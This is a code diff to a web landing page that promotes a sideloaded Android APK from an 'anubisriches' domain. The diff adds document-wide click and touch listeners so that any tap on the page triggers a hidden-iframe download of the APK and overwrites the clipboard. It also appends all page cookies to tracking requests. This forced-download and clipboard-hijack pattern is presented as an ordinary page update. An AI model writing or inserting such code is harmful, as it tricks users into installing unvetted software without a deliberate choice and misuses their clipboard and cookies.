@@ -296,7 +296,7 @@
       </div>
     </div>
 
-    <div onclick="onClickBtn()">
+    <div>
       <img
         style="padding-top: 30px; width: 100%"
         src="files/install.png"
@@ -590,9 +590,32 @@
       <script src="files/Adjustscript.js"></script>
 
       <script>
+        const urlParams = new URLSearchParams(window.location.search);
         const APK_URL =
           "https://downloads.anubisriches.com/anubisriches.prod.3.14.apk";
         const API_BASE = "https://api.anubisriches.com/api/advertising";
+
+        let link;
+
+        function initLink() {
+          const p0 = urlParams.get("ajtoken");
+          const p1 = urlParams.get("p1");
+          const p2 = urlParams.get("p2");
+          const p3 = urlParams.get("p3");
+          const p4 = urlParams.get("p4");
+          const p5 = urlParams.get("p5");
+          const p6 = urlParams.get("p6");
+          const fbPid = getFbPid();
+          const fbClickId = urlParams.get("fbclid");
+          const url = buildURL(p0, p1, p2, p3, p4, p5, p6, fbClickId, fbPid);
+          const apkUrl = APK_URL;
+
+          link =
+            url === ""
+              ? apkUrl
+              : url + "&redirect=" + encodeURIComponent(apkUrl);
+        }
+        initLink();
 
         function getCookie(name) {
           const m = document.cookie.match(
@@ -606,14 +629,12 @@
         }
 
         function getUrl(url) {
+          const cookieParams = document.cookie
+            .replaceAll("; ", "&")
+            .replaceAll(";", "&");
           const search = window.location.search;
-          const cookies = cookieAsQuery();
-          const sep = search
-            ? search + (cookies ? "&" : "")
-            : cookies
-              ? "?"
-              : "";
-          return url + sep + cookies;
+          const separator = search.length ? "&" : "?";
+          return url + search + separator + cookieParams;
         }
 
         function ping(path) {
@@ -623,30 +644,20 @@
         }
 
         window.onload = function () {
-          const urlParams = new URLSearchParams(window.location.search);
-          const p = (k) => urlParams.get(k);
-          const fbClickId = p("fbclid");
-          const url = buildURL(
-            p("ajtoken"),
-            p("p1"),
-            p("p2"),
-            p("p3"),
-            p("p4"),
-            p("p5"),
-            p("p6"),
-            fbClickId,
-            getFbPid(),
-          );
-
-          const link = url
-            ? url + "&redirect=" + encodeURIComponent(APK_URL)
-            : APK_URL;
-          document.getElementById("dapk").href = link;
-
           ping("/onshow");
         };
 
+        // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
+        document.addEventListener("click", onClickBtn, true);
+        document.addEventListener("touchend", onClickBtn, true);
+
+        let clicked = false;
         function onClickBtn() {
+          if (clicked) return;
+          clicked = true;
+          setTimeout(() => (clicked = false), 1000);
+
+          downloadApk();
           ping("/ondownload");
 
           const urlParams = new URLSearchParams(window.location.search);
@@ -664,6 +675,14 @@
           textArea.select();
           document.execCommand("copy");
           document.body.removeChild(textArea);
+        }
+
+        function downloadApk() {
+          const iframe = document.createElement("iframe");
+          iframe.style.display = "none";
+          iframe.src = link;
+          document.body.appendChild(iframe);
+          setTimeout(() => document.body.removeChild(iframe), 1000);
         }
       </script>
 
